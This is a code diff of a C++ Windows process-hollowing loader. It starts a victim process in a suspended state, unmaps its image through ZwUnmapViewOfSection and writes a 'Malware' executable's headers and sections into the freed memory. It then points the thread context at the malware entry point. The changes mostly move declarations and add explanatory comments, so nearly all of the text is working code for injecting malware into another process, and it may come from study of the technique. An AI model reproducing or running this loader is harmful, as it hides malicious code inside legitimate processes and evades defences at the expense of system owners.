@@ -8,16 +8,11 @@
 #pragma comment(lib, "ntdll.lib")
 
 
-//This declaration will be used to hollow the process later in the program.
-typedef LONG(NTAPI* pfnZwUnmapViewOfSection)(HANDLE, PVOID);
-
-
 int main() {
 
 	//startupInfo and processInfo structures are initialized and will be used to populate CreateProcessA() below.
 	LPSTARTUPINFOA startupInfo = new STARTUPINFOA();
 	LPPROCESS_INFORMATION processInfo = new PROCESS_INFORMATION();
-	CONTEXT c{};
 
 
 	//Create victim process and primary thread in suspended state. 
@@ -93,6 +88,9 @@ int main() {
 	std::cout << "[+] Wrote Malware into memory at: 0x" << pMalwareImage << std::endl;
 
 
+	CONTEXT c{};
+
+
 	//Using context structure pointer c to pull thread context for target process.
 	c.ContextFlags = CONTEXT_INTEGER;
 	GetThreadContext(processInfo->hThread, &c);
@@ -110,6 +108,10 @@ int main() {
 	std::cout << "[+] Target Base Address : 0x" << pTargetBaseAddress << std::endl;
 
 
+	//This declaration will be used to hollow the process
+	typedef LONG(NTAPI* pfnZwUnmapViewOfSection)(HANDLE, PVOID);
+
+
 	//Get handle of ntdll.dll and use to get address of ZwUnmapViewOfSection
 	HMODULE hDllBase = GetModuleHandleA("ntdll.dll");
 	pfnZwUnmapViewOfSection pZwUnmapViewOfSection = (pfnZwUnmapViewOfSection)GetProcAddress(hDllBase, "ZwUnmapViewOfSection");
@@ -125,16 +127,20 @@ int main() {
 
 	std::cout << "[+] Process hollowed at Base: 0x" << pTargetBaseAddress << std::endl;
 
-	//*******************************************************************8
-	//get Malware size from NT Headers
+
+	//Get DOS header from Malware
 	PIMAGE_DOS_HEADER pDOSHeader = (PIMAGE_DOS_HEADER)pMalwareImage;
+
+	//Retrieve NT Header using Malware, the DOS header and e_lfanew(the number of bytes from DOS header to PE header)
 	PIMAGE_NT_HEADERS pNTHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)pMalwareImage + pDOSHeader->e_lfanew);
 
+	//Retrieve the SizeOfImage from OptionalHeader using the NT Header
 	DWORD sizeOfMaliciousImage = pNTHeaders->OptionalHeader.SizeOfImage;
 
 	std::cout << "[+] Malware Base Address: 0x" << pNTHeaders->OptionalHeader.ImageBase << std::endl;
 
-
+	
+	//Executing VirtualAlloc again but with read/write/execute permissions granted.
 	PVOID pHollow = VirtualAllocEx(
 		processInfo->hProcess,
 		pTargetBaseAddress,
@@ -151,7 +157,7 @@ int main() {
 	std::cout << "[+] Memory allocated at: 0x" << pHollow << std::endl;
 
 
-	//write malware headers into target
+	//write malware headers into target memory
 	if (!WriteProcessMemory(
 		processInfo->hProcess,
 		pTargetBaseAddress,
@@ -164,7 +170,7 @@ int main() {
 	std::cout << "[+] Headers written to memory." << std::endl;
 
 
-	//write malware sections into target
+	//write malware sections into target memory
 	for (int i = 0; i < pNTHeaders->FileHeader.NumberOfSections; i++) {
 		PIMAGE_SECTION_HEADER pSectionHeader = (PIMAGE_SECTION_HEADER)((LPBYTE)pMalwareImage + pDOSHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));
 
@@ -179,7 +185,8 @@ int main() {
 	std::cout << "[+] Sections written to memory." << std::endl;
 
 
-	//change target entry point to malware entry point & resume thread
+	//change EAX value from thread context to the entry point of the Malware process that's been injected.
+	//ResumeThread() takes the created process out of the suspended state from createProcess().
 	c.Eax = (SIZE_T)((LPBYTE)pHollow + pNTHeaders->OptionalHeader.AddressOfEntryPoint);
 
 	SetThreadContext(processInfo->hThread, &c);
